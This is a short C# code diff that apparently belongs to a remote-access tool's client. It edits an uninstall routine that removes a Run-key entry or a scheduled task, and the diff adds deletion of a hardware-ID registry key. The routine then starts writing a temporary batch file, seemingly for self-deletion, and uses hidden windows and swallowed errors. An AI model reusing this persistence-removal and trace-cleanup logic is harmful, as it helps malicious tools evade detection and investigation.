@@ -18,13 +18,13 @@ namespace Plugin.Handler
                 try
                 {
                     if (!Methods.IsAdmin())
-                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Plugin.InstallFile);
+                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath));
                     else
                     {
                         Process.Start(new ProcessStartInfo()
                         {
                             FileName = "schtasks",
-                            Arguments = "/delete /f /tn " + @"""'" + Plugin.InstallFile + @"""'",
+                            Arguments = "/delete /f /tn " + @"""'" + Path.GetFileNameWithoutExtension(Application.ExecutablePath) + @"""'",
                             CreateNoWindow = true,
                             ErrorDialog = false,
                             UseShellExecute = false,
@@ -34,6 +34,12 @@ namespace Plugin.Handler
                 }
                 catch { }
             }
+
+            try
+            {
+                Registry.CurrentUser.CreateSubKey(@"SOFTWARE\", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteSubKey(Connection.Hwid);
+            }
+            catch { }
 
             string batch = Path.GetTempFileName() + ".bat";
             using (StreamWriter sw = new StreamWriter(batch))
